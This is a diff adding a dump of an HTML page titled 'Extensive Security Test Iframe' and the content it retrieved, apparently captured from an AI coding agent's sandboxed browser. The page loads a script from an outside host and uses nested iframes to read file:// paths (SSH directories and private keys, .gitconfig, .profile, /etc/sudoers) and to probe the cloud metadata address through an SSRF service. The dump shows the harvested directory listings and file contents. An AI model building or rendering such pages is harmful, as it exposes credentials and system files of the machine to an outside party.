@@ -1,0 +1,136 @@
+--- MAIN PAGE HTML ---
+<!DOCTYPE html><html><head>
+  <title>Extensive Security Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc="<script src=&quot;https://donreddy.vercel.app&quot;></script><iframe src=&quot;file:///home/jules/.ssh/&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe><iframe src=&quot;file:///home/jules/.gitconfig&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe><iframe src=&quot;file:///home/jules/.profile&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe><iframe src=&quot;file:///home/&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe><iframe src=&quot;file:///home/jules/.ssh/id_rsa&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe><iframe src=&quot;file:///root/.ssh/id_rsa&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe><iframe src=&quot;file:///etc/sudoers&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe><iframe src=&quot;https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2F169.254.169.254%2F&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json&quot; title=&quot;SSRF Custom Test&quot; width=&quot;25%&quot; height=&quot;25%&quot;></iframe>"></iframe>
+
+
+</body></html>
+
+--- OUTER IFRAME (SRCDOC) DOCUMENT HTML ---
+<html><head><script src="https://donreddy.vercel.app"></script><script type="text/javascript" async="" src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"></script></head><body><iframe src="file:///home/jules/.ssh/" width="25%" height="25%"></iframe><iframe src="file:///home/jules/.gitconfig" width="25%" height="25%"></iframe><iframe src="file:///home/jules/.profile" width="25%" height="25%"></iframe><iframe src="file:///home/" width="25%" height="25%"></iframe><iframe src="file:///home/jules/.ssh/id_rsa" width="25%" height="25%"></iframe><iframe src="file:///root/.ssh/id_rsa" width="25%" height="25%"></iframe><iframe src="file:///etc/sudoers" width="25%" height="25%"></iframe><iframe src="https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2F169.254.169.254%2F&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json" title="SSRF Custom Test" width="25%" height="25%"></iframe></body></html>
+
+--- Inner iframe 1 (src: file:///home/jules/.ssh/) DOCUMENT HTML ---
+<html><head><script>start("/home/jules/.ssh/");</script>
+<script>onHasParentDirectory();</script>
+<script>addRow("authorized_keys","authorized_keys",0,571,"571 B",1746564050,"5/6/25, 8:40:50 PM");</script>
+</head><body></body></html>
+
+--- Inner iframe 2 (src: file:///home/jules/.gitconfig) DOCUMENT HTML ---
+<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">[user]
+	name = google-labs-jules[bot]
+	email = 161369871+google-labs-jules[bot]@users.noreply.github.com
+[core]
+	hooksPath = /dev/null
+</pre></body></html>
+
+--- Inner iframe 3 (src: file:///home/jules/.profile) DOCUMENT HTML ---
+<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;"># ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+	. "$HOME/.bashrc"
+    fi
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+    PATH="$HOME/bin:$PATH"
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+    PATH="$HOME/.local/bin:$PATH"
+fi
+</pre></body></html>
+
+--- Inner iframe 4 (src: file:///home/) DOCUMENT HTML ---
+<html><head><script>start("/home/");</script>
+<script>onHasParentDirectory();</script>
+<script>addRow("jules","jules",1,4096,"4.0 kB",1749059252,"6/4/25, 5:47:32 PM");</script>
+<script>addRow("swebot","swebot",1,4096,"4.0 kB",1749059252,"6/4/25, 5:47:32 PM");</script>
+<script>addRow("ubuntu","ubuntu",1,63,"63 B",1744726313,"4/15/25, 2:11:53 PM");</script>
+</head><body></body></html>
+
+--- Inner iframe 5 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 6 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 7 (src: file:///etc/sudoers) DOCUMENT HTML ---
+<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults	env_reset
+Defaults	mail_badpass
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# This fixes CVE-2005-4890 and possibly breaks some versions of kdesu
+# (#1011624, https://bugs.kde.org/show_bug.cgi?id=452532)
+Defaults	use_pty
+
+# This preserves proxy settings from user environments of root
+# equivalent users (group sudo)
+#Defaults:%sudo env_keep += "http_proxy https_proxy ftp_proxy all_proxy no_proxy"
+
+# This allows running arbitrary commands, but so does ALL, and it means
+# different sudoers have their choice of editor respected.
+#Defaults:%sudo env_keep += "EDITOR"
+
+# Completely harmless preservation of a user preference.
+#Defaults:%sudo env_keep += "GREP_COLOR"
+
+# While you shouldn't normally run git as root, you need to with etckeeper
+#Defaults:%sudo env_keep += "GIT_AUTHOR_* GIT_COMMITTER_*"
+
+# Per-user preferences; root won't have sensible values for them.
+#Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"
+
+# "sudo scp" or "sudo rsync" should be able to use your SSH agent.
+#Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"
+
+# Ditto for GPG agent
+#Defaults:%sudo env_keep += "GPG_AGENT_INFO"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "@include" directives:
+
+@includedir /etc/sudoers.d
+</pre></body></html>
+
+--- Inner iframe 8 (src: chrome-error://chromewebdata/) DOCUMENT HTML ---
+<html><head></head><body></body></html>
+
+--- Inner iframe 9 (src: about:blank) DOCUMENT HTML ---
+Could not access content: Frame.content: Unable to retrieve content because the page is navigating and changing the content.
